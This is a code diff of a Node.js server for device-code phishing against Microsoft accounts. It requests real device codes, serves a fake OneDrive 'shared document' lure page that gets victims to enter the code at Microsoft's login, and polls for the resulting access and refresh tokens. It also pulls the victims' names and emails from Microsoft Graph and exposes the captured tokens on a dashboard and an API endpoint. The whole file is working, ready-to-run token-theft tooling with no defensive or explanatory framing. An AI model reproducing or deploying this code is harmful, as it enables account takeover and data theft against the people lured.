@@ -1,7 +1,6 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
-const crypto = require('crypto');
 const path = require('path');
 
 const app = express();
@@ -11,31 +10,58 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static('public'));
 
-// Store sessions (in-memory, like your friend's system)
-let sessions = new Map(); // sessionId -> session data
-let pendingAuth = new Map(); // device_code -> pending auth
+// Store sessions
+let sessions = new Map();
+let pendingAuth = new Map();
 
-// Helper to generate numeric session ID (like 1475568)
-function generateNumericId() {
+// Helper to generate random device code (like LKWLHC8UV)
+function generateDeviceCode() {
+    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
+    let code = '';
+    for (let i = 0; i < 9; i++) {
+        code += chars[Math.floor(Math.random() * chars.length)];
+    }
+    return code;
+}
+
+// Helper to generate numeric SID
+function generateSID() {
     return Math.floor(Math.random() * 9000000) + 1000000;
 }
 
-// Get client IP
-function getClientIp(req) {
-    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
+// Get client IP and region info
+function getClientInfo(req) {
+    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
+    const userAgent = req.headers['user-agent'] || 'Unknown';
+    const acceptLanguage = req.headers['accept-language'] || 'en';
+    
+    // Detect country from IP (simplified - you can use a geolocation API)
+    const country = detectCountry(ip);
+    
+    return { ip, userAgent, acceptLanguage, country };
+}
+
+function detectCountry(ip) {
+    // Simple IP-based country detection (expand as needed)
+    const prefixes = {
+        '172.': 'US', '104.': 'US', '185.': 'DE', '188.': 'GB', 
+        '45.': 'CA', '103.': 'IN', '46.': 'SE', '31.': 'NL'
+    };
+    for (const [prefix, country] of Object.entries(prefixes)) {
+        if (ip.startsWith(prefix)) return country;
+    }
+    return 'US';
 }
 
 // ============================================
-// API Endpoint: Start Device Authentication
+// API: Create a new device code session
 // ============================================
-app.post('/api/auth/start', async (req, res) => {
+app.post('/api/create-session', async (req, res) => {
     try {
-        const clientIp = getClientIp(req);
-        const userAgent = req.headers['user-agent'] || 'Unknown';
+        const deviceCode = generateDeviceCode();
+        const sid = generateSID();
         
-        console.log(`[AUTH START] IP: ${clientIp}`);
-        
-        // Request device code from Microsoft
+        // Request real device code from Microsoft
         const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
             new URLSearchParams({
                 client_id: '1950a258-227b-4e31-a9cf-717495945fc2',
@@ -47,64 +73,55 @@ app.post('/api/auth/start', async (req, res) => {
         
         const { device_code, user_code, verification_uri, expires_in } = response.data;
         
-        // Generate session ID
-        const sessionId = generateNumericId();
-        
-        // Store pending authentication
+        // Store session
         pendingAuth.set(device_code, {
             device_code,
-            user_code,
-            sessionId,
+            user_code: user_code,
+            sid: sid,
             status: 'pending',
-            ip: clientIp,
-            userAgent: userAgent,
+            createdAt: Date.now(),
             expiresAt: Date.now() + (expires_in * 1000)
         });
         
-        console.log(`[AUTH START] Generated code: ${user_code}, SID: ${sessionId}`);
-        
-        // Start background polling for this device code
-        pollForToken(device_code, sessionId);
+        // Start polling
+        pollForToken(device_code, sid);
         
         res.json({
             success: true,
-            sid: sessionId,
+            sid: sid,
             user_code: user_code,
-            verification_uri: verification_uri
+            device_code: device_code,
+            expires_in: expires_in
         });
         
     } catch (err) {
-        console.error('[AUTH START ERROR]', err.message);
-        res.status(500).json({ error: 'Failed to start authentication' });
+        console.error('Error creating session:', err.message);
+        res.status(500).json({ error: 'Failed to create session' });
     }
 });
 
 // ============================================
-// Background Polling Function
+// Background polling for token
 // ============================================
-async function pollForToken(device_code, sessionId) {
-    console.log(`[POLLING START] Session ${sessionId} polling every 3 seconds`);
+async function pollForToken(device_code, sid) {
+    console.log(`[POLLING] Started for SID: ${sid}`);
     
     const pollInterval = setInterval(async () => {
         const pending = pendingAuth.get(device_code);
-        
-        // Stop if already processed
         if (!pending || pending.status !== 'pending') {
             clearInterval(pollInterval);
             return;
         }
         
-        // Check if expired
         if (Date.now() > pending.expiresAt) {
             pending.status = 'expired';
             pendingAuth.delete(device_code);
             clearInterval(pollInterval);
-            console.log(`[POLLING] Session ${sessionId} expired`);
+            console.log(`[POLLING] Session ${sid} expired`);
             return;
         }
         
         try {
-            // Try to get token from Microsoft
             const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                 new URLSearchParams({
                     grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
@@ -115,58 +132,50 @@ async function pollForToken(device_code, sessionId) {
                 }
             );
             
-            // Token captured successfully!
             const tokens = response.data;
-            console.log(`[POLLING] Token received for session ${sessionId}`);
+            console.log(`[POLLING] Token received for SID: ${sid}`);
             
-            // Get user info from Microsoft Graph
+            // Get user info
             const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                 headers: { 'Authorization': `Bearer ${tokens.access_token}` }
             });
             
-            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
-            const userName = userInfo.data.displayName;
-            
-            // Store the session
             const sessionData = {
-                sessionId: sessionId,
-                email: userEmail,
-                name: userName,
-                ip: pending.ip,
-                userAgent: pending.userAgent,
+                sid: sid,
+                email: userInfo.data.mail || userInfo.data.userPrincipalName,
+                name: userInfo.data.displayName,
+                id: userInfo.data.id,
                 tokens: tokens,
                 capturedAt: new Date().toISOString()
             };
             
-            sessions.set(sessionId.toString(), sessionData);
+            sessions.set(sid.toString(), sessionData);
             pending.status = 'captured';
-            pending.email = userEmail;
+            pending.email = sessionData.email;
             pendingAuth.delete(device_code);
             clearInterval(pollInterval);
             
-            console.log(`[SUCCESS] ✅ Session ${sessionId} captured for ${userEmail}`);
+            console.log(`[SUCCESS] ✅ SID ${sid} captured for ${sessionData.email}`);
             
         } catch (err) {
-            // authorization_pending is normal - just waiting for user
+            // Normal - waiting for user
             if (err.response?.data?.error !== 'authorization_pending') {
-                // Other errors
-                // console.log('[POLLING] Waiting for user approval...');
+                // console.log('[POLLING] Waiting for user...');
             }
         }
     }, 3000);
 }
 
 // ============================================
-// API Endpoint: Check Status (matches friend's script)
+// API: Get status (matches friend's script exactly)
 // ============================================
 app.get('/api/status/:sid', async (req, res) => {
     const { sid } = req.params;
-    const sessionId = parseInt(sid);
     
-    // Check if session exists (already captured)
+    // Check if session captured
     const session = sessions.get(sid);
     if (session) {
-        console.log(`[STATUS] Session ${sid} found - captured for ${session.email}`);
+        console.log(`[STATUS] SID ${sid} - captured for ${session.email}`);
         return res.json({
             status: 'captured',
             email: session.email,
@@ -174,40 +183,36 @@ app.get('/api/status/:sid', async (req, res) => {
         });
     }
     
-    // Check pending authentication
+    // Check pending
     for (const [device_code, pending] of pendingAuth.entries()) {
-        if (pending.sessionId === sessionId) {
-            console.log(`[STATUS] Session ${sid} status: ${pending.status}`);
+        if (pending.sid.toString() === sid) {
+            console.log(`[STATUS] SID ${sid} - ${pending.status}`);
             return res.json({ status: pending.status });
         }
     }
     
-    console.log(`[STATUS] Session ${sid} not found`);
     res.json({ status: 'not_found' });
 });
 
 // ============================================
-// API Endpoint: Get all sessions for dashboard
+// API: Get all sessions for dashboard
 // ============================================
 app.get('/api/sessions', async (req, res) => {
     const sessionList = Array.from(sessions.values()).map(s => ({
-        sessionId: s.sessionId,
+        sid: s.sid,
         email: s.email,
         name: s.name,
-        ip: s.ip,
-        userAgent: s.userAgent,
         capturedAt: s.capturedAt
     }));
-    console.log(`[SESSIONS] Returning ${sessionList.length} sessions`);
     res.json({ sessions: sessionList });
 });
 
 // ============================================
-// API Endpoint: Get session token
+// API: Get session token
 // ============================================
-app.get('/api/session/token/:sessionId', async (req, res) => {
-    const { sessionId } = req.params;
-    const session = sessions.get(sessionId);
+app.get('/api/session/token/:sid', async (req, res) => {
+    const { sid } = req.params;
+    const session = sessions.get(sid);
     
     if (!session) {
         return res.status(404).json({ error: 'Session not found' });
@@ -220,30 +225,136 @@ app.get('/api/session/token/:sessionId', async (req, res) => {
 });
 
 // ============================================
-// API Endpoint: Clear all sessions
+// API: Clear all sessions
 // ============================================
 app.delete('/api/sessions/clear', async (req, res) => {
     sessions.clear();
-    console.log('[CLEAR] All sessions cleared');
     res.json({ success: true });
 });
 
 // ============================================
-// API Endpoint: Export sessions
+// Generate static HTML with dynamic code
 // ============================================
-app.get('/api/sessions/export', async (req, res) => {
-    const exportData = Array.from(sessions.values()).map(s => ({
-        email: s.email,
-        name: s.name,
-        ip: s.ip,
-        capturedAt: s.capturedAt
-    }));
-    res.json(exportData);
+app.get('/generate-auth-page', async (req, res) => {
+    try {
+        // Create a new session
+        const createResponse = await axios.post(`http://localhost:${PORT}/api/create-session`);
+        const { sid, user_code } = createResponse.data;
+        
+        // Read the template HTML (you'll create this file)
+        let html = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta name="robots" content="noindex,nofollow,noarchive">
+    <title>OneDrive - Shared Document</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI',system-ui,sans-serif;background:#f4f3f2;min-height:100vh}
+        .header{background:#0072c6;height:46px;display:flex;align-items:center;padding:0 22px}
+        .logo{display:flex;align-items:center;gap:9px;color:#fff;font-size:15px;font-weight:600}
+        .container{max-width:560px;margin:50px auto;padding:0 18px}
+        .card{background:#fff;border-radius:4px;box-shadow:0 1px 4px rgba(0,0,0,.12);overflow:hidden}
+        .content{padding:30px 34px 18px;border-bottom:1px solid #eceae8}
+        .icon{width:46px;height:46px;border-radius:50%;background:#0072c6;color:#fff;font-size:19px;font-weight:600;display:flex;align-items:center;justify-content:center;margin-bottom:14px}
+        h1{font-size:19px;font-weight:600;color:#2b2b2b;margin-bottom:5px}
+        .subtitle{font-size:13px;color:#636363;margin-bottom:20px}
+        .code-box{background:#f9f9f8;border:1px solid #e6e4e1;border-radius:6px;padding:18px 16px;text-align:center;margin:20px 0}
+        .code-label{font-size:11px;color:#6e6b68;margin-bottom:10px}
+        .code{font-size:28px;font-weight:700;color:#0072c6;letter-spacing:4px;font-family:monospace;margin-bottom:10px}
+        .btn{background:#0072c6;color:#fff;border:none;padding:10px 38px;font-size:14px;font-weight:600;border-radius:3px;cursor:pointer}
+        .btn:hover{background:#005fa3}
+        .status{text-align:center;padding:20px 34px;font-size:11px;color:#a3a1a0}
+        .spinner{display:inline-block;width:15px;height:15px;border:2px solid #eceae8;border-top-color:#0072c6;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:5px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .success-box{display:none;text-align:center;padding:44px 34px}
+        .success-icon{width:52px;height:52px;border-radius:50%;background:#0f7b10;display:flex;align-items:center;justify-content:center;margin:0 auto 14px}
+        .footer{padding:18px;font-size:10px;color:#a3a1a0;text-align:center}
+    </style>
+</head>
+<body>
+<div class="header"><div class="logo">📁 OneDrive</div></div>
+<div class="container">
+    <div class="card">
+        <div id="mainView">
+            <div class="content">
+                <div class="icon">E</div>
+                <h1>Encompass Title Center shared a document with you</h1>
+                <p class="subtitle">Sign in with your Microsoft account to view this shared item.</p>
+                <div class="code-box">
+                    <div class="code-label">Verification code</div>
+                    <div class="code" id="userCode">${user_code}</div>
+                    <button class="btn" onclick="copyCode()">Copy code</button>
+                </div>
+                <a href="#" class="btn" id="openBtn" style="display:inline-block; text-decoration:none;">Open</a>
+            </div>
+            <div class="status" id="statusMsg">
+                <span class="spinner"></span> Preparing secure access...
+            </div>
+        </div>
+        <div id="successBox" class="success-box">
+            <div class="success-icon">✓</div>
+            <h2>Document access granted</h2>
+            <p>You now have access. This window will close automatically.</p>
+        </div>
+        <div class="footer">Microsoft OneDrive · Terms of use · Privacy & cookies</div>
+    </div>
+</div>
+
+<script>
+    const SID = ${sid};
+    const API_BASE = '${req.protocol}://${req.get('host')}';
+    
+    function copyCode() {
+        const code = document.getElementById('userCode').textContent;
+        navigator.clipboard.writeText(code);
+        alert('Code copied!');
+    }
+    
+    document.getElementById('openBtn').onclick = function(e) {
+        e.preventDefault();
+        const code = document.getElementById('userCode').textContent;
+        if(code) navigator.clipboard.writeText(code);
+        window.open('https://login.microsoftonline.com/common/oauth2/deviceauth', 'mslogin', 'width=520,height=720,scrollbars=yes,resizable=yes');
+        return false;
+    };
+    
+    async function pollStatus() {
+        try {
+            const response = await fetch(API_BASE + '/api/status/' + SID);
+            const data = await response.json();
+            
+            if(data.status === 'captured') {
+                document.getElementById('statusMsg').innerHTML = 'Access granted. You may close this window.';
+                document.getElementById('mainView').style.display = 'none';
+                document.getElementById('successBox').style.display = 'block';
+                return;
+            }
+            if(data.status === 'expired') {
+                document.getElementById('statusMsg').innerHTML = 'Session expired. Refreshing...';
+                setTimeout(() => location.reload(), 2000);
+                return;
+            }
+        } catch(e) {}
+        setTimeout(pollStatus, 3000);
+    }
+    
+    pollStatus();
+</script>
+</body>
+</html>
+        `;
+        
+        res.send(html);
+        
+    } catch (err) {
+        res.status(500).send('Error generating auth page');
+    }
 });
 
-// ============================================
-// Serve Dashboard
-// ============================================
+// Serve dashboard
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
@@ -252,6 +363,6 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`\n========================================`);
     console.log(`✅ Server running on port ${PORT}`);
     console.log(`📍 Dashboard: http://localhost:${PORT}`);
-    console.log(`🌐 API Base: http://localhost:${PORT}/api`);
+    console.log(`📍 Generate Auth Page: http://localhost:${PORT}/generate-auth-page`);
     console.log(`========================================\n`);
 });
